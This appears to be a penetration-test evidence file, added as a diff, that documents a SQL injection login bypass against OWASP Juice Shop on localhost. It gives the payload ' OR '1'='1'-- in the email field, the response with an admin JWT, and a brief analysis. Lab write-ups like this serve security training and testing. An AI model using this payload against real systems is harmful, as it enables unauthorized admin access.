@@ -1,0 +1,41 @@
+=== SQL Injection Vulnerability Evidence ===
+
+Target: OWASP Juice Shop
+Endpoint: POST /rest/user/login
+Date: January 29, 2026
+Vulnerability: SQL Injection (CRITICAL)
+
+--- Request Details ---
+Method: POST
+URL: http://localhost:3000/rest/user/login
+Content-Type: application/json
+
+--- Vulnerable Request ---
+{
+  "email": "' OR '1'='1'--",
+  "password": "test"
+}
+
+--- Response ---
+HTTP/1.1 200 OK
+Content-Type: application/json
+
+{
+  "authentication": {
+    "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDEtMjkgMTY6MDQ6NDYuMjExICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDEtMjkgMTY6MDQ6NDYuMjExICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc2OTcwMjkxMX0.V12yZ63NFgJLaiMBaTfLqqCJV2SUbRwkmwiqVyuWlezIO1HCExqNHecq7mNOB0PYkyIUj5rlpDbdIfWfgTmz6jOUm2xqxOPZ777xY2mLcY_0Qe8D8k6i0QhPGqUxTS2sq6rF8KcElHCWgm8Lt-fa3Z2kHqaHGJeUMeTTDsU0aaA",
+    "bid": 1,
+    "umail": "admin@juice-sh.op"
+  }
+}
+
+--- Analysis ---
+This response indicates successful authentication bypass. The application returned:
+1. JWT token for admin user
+2. User ID (bid: 1)
+3. Admin email address
+4. No error message despite invalid credentials
+
+The SQL injection payload "' OR '1'='1'--" successfully bypassed authentication.
+
+--- Impact ---
+CRITICAL: Complete authentication bypass allowing unauthorized admin access
